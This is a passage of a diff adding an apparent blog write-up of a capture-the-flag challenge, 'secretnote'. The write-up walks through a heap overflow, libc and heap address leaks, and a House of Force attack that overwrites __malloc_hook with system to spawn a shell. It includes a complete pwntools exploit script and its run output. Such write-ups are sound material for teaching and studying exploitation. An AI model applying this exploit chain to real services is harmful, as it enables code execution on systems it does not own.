+</span></span><span style="display:flex;"><span>      ptr <span style="color:#f92672">=</span> strdup(passwd);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span> {
+</span></span><span style="display:flex;"><span>	  ptr <span style="color:#f92672">=</span> (<span style="color:#66d9ef">char</span> <span style="color:#f92672">*</span>)malloc(__size);     <span style="color:#75715e">// We can allocate a chunk with an arbitrary size
+</span></span></span><span style="display:flex;"><span><span style="color:#75715e"></span>      fgets(ptr,(<span style="color:#66d9ef">int</span>)__size <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span>,stdin);
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>    insert(name,__size,ptr,idx_00);
+</span></span><span style="display:flex;"><span>  }
+</span></span></code></pre></div><p>You can see if the size is bigger than 0x101, <strong>edit</strong> will allocate a new chunk with the desired size.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># From heap overflow to house of force</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Overwriting the top_chunk size field&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwrite top_chunk_size to a big value</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Resolve the top_chunk address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>top_chunk <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x190</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] top_chunk is at </span><span style="color:#e6db74">{</span>hex(top_chunk)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate the delta</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delta <span style="color:#f92672">=</span> (libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">-</span> top_chunk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] delta between top_chunk and system is </span><span style="color:#e6db74">{</span>hex(delta)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate a huge chunk with the delta size, we are going to use the edit function</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0xdeadbeef&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pwLen: &#34;</span>, bytes(str(delta), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] chunk with size </span><span style="color:#e6db74">{</span>hex(delta)<span style="color:#e6db74">}</span><span style="color:#e6db74"> allocated&#34;</span>)
+</span></span></code></pre></div><p>After inspecting the area around <strong>__malloc_hook</strong> we can predict where the next chunk will be allocated ( remember chunk header is 0x10 sized )</p>
+<pre tabindex="0"><code>pwndbg&gt;top_chunk
+Top chunk
+Addr: 0x7fbbf85aac00
+Size: 0xffff80440900c819
+pwndbg&gt; dq &amp;__malloc_hook-2
+00007fbbf85aac00     00007fbbf8280ad0 ffff80440900c819
+00007fbbf85aac10     0000000000000000 0000000000000000
+00007fbbf85aac20     0000000100000000 0000000000000000
+00007fbbf85aac30     0000000000000000 0000000000000000
+</code></pre><p>Now we reuse <strong>edit</strong> to allocate a 8 bytes chunks and write in to it the address of <strong>system</strong></p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Allocate a new chunk with the edit function so we can choose the content</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0xdeadbeef&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pwLen: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;8&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password: &#34;</span>, p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] __malloc_hook overwrited with the address of system:</span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span></code></pre></div><p>Then we need to call <strong>malloc</strong> again but the size should be the address of the string <code>/bin/sh</code>. As we do previously, we use edit again.</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e"># Call malloc with the address of /bin/sh as argument</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0xdeadbeef&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pwLen: &#34;</span>, bytes(str(bin_sh), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span></code></pre></div><p>And  now we have a shell :)</p>
+<pre tabindex="0"><code>[+] Leaking libc address
+    [-] @puts is at : 0x7f99f566d510
+    [-] libc base address is 0x7f99f5600000
+[+] Leaking heap address
+    [-] first note is at 0x974290
+[+] House of force
+    [-] top_chunk_size field overwritten
+    [-] top_chunk is at 0x974420
+    [-] delta between top_chunk and system is 0x7f99f50367d0
+    [-] chunk with size 0x7f99f50367d0 allocated
+    [-] __malloc_hook overwrited with the address of system:0x7f99f5640ff0
+    [-] pwned ...
+[*] Switching to interactive mode
+Enter password: $ ls
+exploit.py  ld-2.26.so    libc-2.26.so  secretnote
+$  
+</code></pre><p>Here is the working exploit :</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/bin/python</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>terminal <span style="color:#f92672">=</span> [ <span style="color:#e6db74">&#34;alacritty&#34;</span>,<span style="color:#e6db74">&#34;-e&#34;</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#context.log_level = &#34;DEBUG&#34;</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>elf <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./secretnote&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;./libc-2.26.so&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> gdb<span style="color:#f92672">.</span>debug([<span style="color:#e6db74">&#34;./secretnote&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">else</span>:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> process([<span style="color:#e6db74">&#34;./secretnote&#34;</span>])
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">create</span>(username:bytes, password:bytes)<span style="color:#f92672">-&gt;</span>int:
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;1&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Page no : &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>index <span style="color:#f92672">=</span> int(io<span style="color:#f92672">.</span>recvline())
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter username: &#34;</span>, username)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter password: &#34;</span>, password)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#66d9ef">return</span> index
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e">#LIBC</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Leaking libc address&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Create a note with huge username to trigger heap overflow</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(elf<span style="color:#f92672">.</span>got[<span style="color:#e6db74">&#34;puts&#34;</span>]) , <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Trigger show function to leak</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password : &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc_leak <span style="color:#f92672">=</span> u64(libc_leak <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> len(libc_leak)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] @puts is at : </span><span style="color:#e6db74">{</span>hex(libc_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> libc_leak <span style="color:#f92672">-</span> libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>puts
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] libc base address is </span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>address)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># HEAP</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># table is at 0x404040 in the data section</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] Leaking heap address&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Reuse the bug to leak the heap address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xde</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">8</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0x404040</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;4&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password : &#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvline()[:<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>heap_leak <span style="color:#f92672">=</span> u64(heap_leak <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span> <span style="color:#f92672">*</span> (<span style="color:#ae81ff">8</span> <span style="color:#f92672">-</span> len(heap_leak)))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] first note is at </span><span style="color:#e6db74">{</span>hex(heap_leak)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># From heap overflow to house of force</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;[+] House of force&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Overwrite top_chunk_size to a big value</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>idx <span style="color:#f92672">=</span> create(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x50</span> <span style="color:#f92672">+</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">24</span> <span style="color:#f92672">+</span> p64(<span style="color:#ae81ff">0xffffffffffffffff</span>), <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] top_chunk_size field overwritten&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Resolve the top_chunk address</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>top_chunk <span style="color:#f92672">=</span> heap_leak <span style="color:#f92672">+</span> <span style="color:#ae81ff">0x190</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] top_chunk is at </span><span style="color:#e6db74">{</span>hex(top_chunk)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Calculate the delta</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>delta <span style="color:#f92672">=</span> (libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>__malloc_hook <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x20</span>) <span style="color:#f92672">-</span> top_chunk
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] delta between top_chunk and system is </span><span style="color:#e6db74">{</span>hex(delta)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate a huge chunk with the delta size, we are going to use the edit function</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0xdeadbeef&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pwLen: &#34;</span>, bytes(str(delta), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;123456&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] chunk with size </span><span style="color:#e6db74">{</span>hex(delta)<span style="color:#e6db74">}</span><span style="color:#e6db74"> allocated&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Allocate a new chunk with the edit function so we can choose the content</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0xdeadbeef&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pwLen: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;8&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;password: &#34;</span>, p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&gt;&gt;&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] __malloc_hook overwrited with the address of system:</span><span style="color:#e6db74">{</span>hex(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>system)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span><span style="color:#75715e"># Call malloc with the address of /bin/sh as argument</span>
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34; [-] pwned ...&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>bin_sh <span style="color:#f92672">=</span> next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendline(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;2&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;index: &#34;</span>, bytes(str(idx), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Enter username: &#34;</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;0xdeadbeef&#34;</span>)
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>sendlineafter(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;pwLen: &#34;</span>, bytes(str(bin_sh), <span style="color:#e6db74">&#34;utf-8&#34;</span>))
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>  
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
+</span></span></code></pre></div>
+            </div>
+        </article>
+
+        <hr />
+
+        <div class="post-info">
+            
+            
+  		</div>
+    </main>
+
+            </div>
+
+            
+                <footer class="footer">
+    
+    
+</footer>
+
+            
+        </div>
+
+        
+
+
+
